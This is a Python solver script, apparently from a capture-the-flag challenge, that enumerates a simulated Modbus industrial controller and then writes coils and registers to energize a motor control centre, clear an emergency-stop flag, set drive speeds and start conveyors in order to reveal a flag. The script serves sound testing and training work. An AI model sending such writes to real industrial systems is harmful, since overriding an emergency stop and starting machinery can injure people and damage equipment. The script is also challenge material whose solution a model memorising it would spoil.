#!/usr/bin/env python3
"""
INTERNAL — NOT FOR PLAYER DISTRIBUTION.
Solvability check for zone1-modbus via the "enumerate + inject" path
(as opposed to the pcap-replay path — see generate_maintenance_pcap.py).
"""

import sys
import time
from pyModbusTCP.client import ModbusClient

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502

COIL_MCC_MASTER_ENABLE = 0
COIL_ESTOP_TRIPPED     = 1
COIL_CONV1_RUN         = 2
COIL_CONV2_RUN         = 3

HREG_VFD1_SPEED_SP = 0
HREG_VFD2_SPEED_SP = 1
HREG_DIAG_CODE     = 3

IREG_VFD1_ACTUAL = 0
IREG_VFD2_ACTUAL = 1
IREG_FLAG_BASE   = 10
FLAG_REG_COUNT   = 16

TARGET_SPEED = 900  # inside the 850-950 nominal band


def main():
    c = ModbusClient(host=HOST, port=PORT, auto_open=True, auto_close=True)

    print("[*] Enumerating coils 0-4...")
    print("    coils:", c.read_coils(0, 5))
    print("[*] Enumerating holding registers 0-3...")
    print("    holding:", c.read_holding_registers(0, 4))
    print("[*] Enumerating input registers 0-2...")
    print("    input:", c.read_input_registers(0, 3))

    print("[*] Energizing MCC master...")
    c.write_single_coil(COIL_MCC_MASTER_ENABLE, True)

    print("[*] Clearing E-STOP...")
    c.write_single_coil(COIL_ESTOP_TRIPPED, False)

    print(f"[*] Setting VFD speed setpoints to {TARGET_SPEED} rpm...")
    c.write_single_register(HREG_VFD1_SPEED_SP, TARGET_SPEED)
    c.write_single_register(HREG_VFD2_SPEED_SP, TARGET_SPEED)

    print("[*] Starting conveyors 1 and 2...")
    c.write_single_coil(COIL_CONV1_RUN, True)
    c.write_single_coil(COIL_CONV2_RUN, True)

    print("[*] Waiting for sustained nominal run state...")
    for i in range(30):
        diag = c.read_holding_registers(HREG_DIAG_CODE, 1)
        act1 = c.read_input_registers(IREG_VFD1_ACTUAL, 1)
        act2 = c.read_input_registers(IREG_VFD2_ACTUAL, 1)
        print(f"    t={i*0.5:>4.1f}s diag={diag} actual=({act1},{act2})")

        flag_regs = c.read_input_registers(IREG_FLAG_BASE, FLAG_REG_COUNT)
        if flag_regs and any(flag_regs):
            flag_bytes = bytearray()
            for reg in flag_regs:
                flag_bytes.append((reg >> 8) & 0xFF)
                flag_bytes.append(reg & 0xFF)
            flag = flag_bytes.split(b"\x00")[0].decode("utf-8", errors="replace")
            print(f"\n[+] FLAG: {flag}")
            return 0
        time.sleep(0.5)

    print("\n[-] Flag not retrieved — check timing/band constants.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
